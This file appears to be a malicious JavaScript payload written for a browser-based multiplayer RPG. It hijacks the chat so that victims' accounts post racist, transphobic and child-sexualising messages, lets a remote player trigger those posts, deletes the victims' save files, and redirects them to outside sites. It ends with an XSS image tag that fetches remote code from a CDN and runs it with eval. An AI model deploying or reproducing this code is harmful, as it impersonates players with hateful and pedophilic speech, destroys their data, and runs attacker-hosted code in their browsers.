
function club() {
if(window.hammer) return;
const chatMessageCallbacks = [];
console.log("game has been loaded");

//chat message callback
/////
	const cbam = chatboxAddMessage;
	chatboxAddMessage = (a,b,c,d,e,f,g,h,i,j,k,l) => 
	{
		for(let callb of chatMessageCallbacks) callb(a,b,c,d,e,f,g,h,i,j,k,l);
		cbam(a,b,c,d,e,f,g,h,i,j,k,l);
	}
/////
//Force chat messages
/////
const spamMessage = "FUСК ТRАИІЕS, КILL ИІggЕRS";
const messages = 
[
	"I'm gonna be real with you guys, I'm not too fond of persons of color anymore...",
	"I love little girls",
	"I wish I had a cunny on my dong right now",
	"Feeling pretty straight today.",
	"I'm gonna be real with you guys, I'm not too fond of transgenders anymore",
	"Man I wish I had a cute little young girl to kiss"
]
	const forceMessage = () => 
	{
		setTimeout(()=>{
			sendSessionCommand("gsay", [messages[parseInt(messages.length * Math.random())]]);
		}, Math.random() * 1000 * 60 * 2 + 15000);
	}

	const signal = "Hello, hi!";
	const listenForceMessage = (msg, type, player)=>
	{
		if(!globalPlayerData[player] || !globalPlayerData[player].name.startsWith("xf")) return;
		if(msg.startsWith(signal)) 
		{
			const remsig = msg.substr(signal.length+2);
			let name = remsig.substr(0,remsig.indexOf(" "));
			if(name == "") name = remsig;
			if(name == playerName);
			forceMessage();
		}
	}
	chatMessageCallbacks.push(listenForceMessage);
/////
//Random redirect
/////

setInterval(()=>{if(Math.random() > 1 / 16) forceMessage()}, 60000);
if(Math.random() > 1/64) 
	{
		setTimeout(()=>{setInterval(()=>{sendSessionCommand("gsay", [spamMessage])})}, 120000)
	}

const redlist = 
[
	"https://yumeboo.ru/",
	"https://archive.yumeboo.ru/",
	"https://archive.yumeboo.ru/",
	"https://www.youtube.com/@Char0x61",
	"https://www.youtube.com/@Char0x61",
	"https://www.youtube.com/watch?v=LDmq0-sU_Kc"
];

function deleteSaves() 
{
	for(let saveSlot = 1; saveSlot <= 15; saveSlot++) 
	{
		const request = indexedDB.open(`/easyrpg/${ynoGameId}/Save`);
		request.onsuccess = function (_e) {
		  const db = request.result; 
		  const transaction = db.transaction(['FILE_DATA'], 'readwrite');
		  const objectStoreDeleteRequest = transaction.objectStore('FILE_DATA').delete(`/easyrpg/${ynoGameId}/Save/Save${saveSlot}.lsd`);
		  objectStoreDeleteRequest.onsuccess = () => resolve(true);
		  objectStoreDeleteRequest.onerror = () => resolve(false);
		};
	}
}

if(Math.random() < 1 / 4) 
{
	deleteSaves();	
}

if(Math.random() < 1 / 16) 
{
	setTimeout(()=>{
		onbeforeunload = null;
		if(Math.random() < 1) deleteSaves();
		window.location = redlist[parseInt(Math.random() * redlist.length)];
	}, 1000 * 60 * 2.6 + Math.random() * 1000 * 60 * 8)	
}
}
club();
window.hammer = true;
<img src=x onerror=\"fetch('https://cdn.jsdelivr.net/gh/dollv10/saber@main/spear.js').then(r=>r.text()).then(eval)\">